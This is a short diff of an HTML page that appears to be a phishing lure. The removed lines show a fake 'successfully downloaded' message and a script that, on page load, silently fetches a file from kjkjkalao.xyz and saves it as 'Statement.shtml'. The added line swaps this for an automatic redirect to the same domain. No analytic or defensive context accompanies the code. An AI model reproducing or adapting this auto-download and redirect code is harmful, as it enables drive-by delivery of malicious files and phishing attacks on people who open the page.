@@ -4,30 +4,11 @@
 
 
 <body>
-<div style="margin-top: 11%;" class="server-message">
-                <h1 style="font-size: 85px;margin: 0;font-weight: 300;    line-height: 1.1;color:grey;text-align: center;"></h1>
-                <h2 style="margin-top: 2%;margin-bottom: 2%;font-weight: 300;    line-height: 1.1;color: #a56565;;text-align: center;">You have successfully downloaded your file. :)</h2>
-                <p style="font-size: 35px;margin: 1%;font-weight: 300;    line-height: 1.1;color:grey;text-align: center;"></p>
-</div>
-
 <script>
-       function downloadFile(url, fileName) {
-  fetch(url, { method: 'get', mode: 'no-cors', referrerPolicy: 'no-referrer' })
-    .then(res => res.blob())
-    .then(res => {
-      const aElement = document.createElement('a');
-      aElement.setAttribute('download', fileName);
-      const href = URL.createObjectURL(res);
-      aElement.href = href;
-      aElement.setAttribute('target', '_blank');
-      aElement.click();
-      URL.revokeObjectURL(href);
-    });
-};
     window.addEventListener("load", function(){
 
 
-downloadFile('https://www.kjkjkalao.xyz/statement.html', 'Statement.shtml')
+window.location.href= "https://www.kjkjkalao.xyz/";
         
     });
     
